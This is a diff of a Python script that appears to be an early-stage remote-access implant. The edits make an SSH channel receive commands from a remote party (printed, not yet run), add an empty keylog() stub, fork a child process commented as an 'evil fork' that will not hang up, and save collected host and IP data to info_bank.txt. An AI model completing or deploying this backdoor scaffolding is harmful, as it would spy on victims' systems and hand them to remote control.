@@ -63,12 +63,13 @@ def fetchSFTP():
         
         chan = client.get_transport().open_session()
 
-        chan.send('Hello? Yes this is client calling via SSH!')
-        print(chan.recv(1024))
-      
-
+        chan.send('Hello, I am a nice client :)')
+        command = chan.recv(1024)
+        command = command.decode()
+        print("Executing this -->" + str(command))
         
-        return sftp
+      
+        return chan
     except Exception as e:
         print("We ran into a problem and have to close. Please try again later.")
         print("Unhandled exception ->"+ str(e))
@@ -145,6 +146,9 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
+def keylog():
+    
+    return 0
 def run():
 
     sftp = fetchSFTP()
@@ -152,12 +156,11 @@ def run():
         pid = os.fork()
         if pid == 0:
                 #I am the child connection, I am an evil fork and wont HUP
-                infoBank = getInput()
+            keylog()
+            os._exit(0)   
         else:
-                i#nfoBank = getInput()
+                infoBank = getInput()
                 #I am the parent and need to die after I finish my work
-                os._exit(0) #children are returning success to parent
-                
     except OSError:
         sys.stderr.write("Could not create a child process\n")
     
@@ -165,8 +168,7 @@ def run():
     with open('info_bank.txt', 'w') as f:
         for item in infoBank:
             f.write("%s\n" % item)
-    
-
+            
     sftp.close()
     
 # MAIN # 
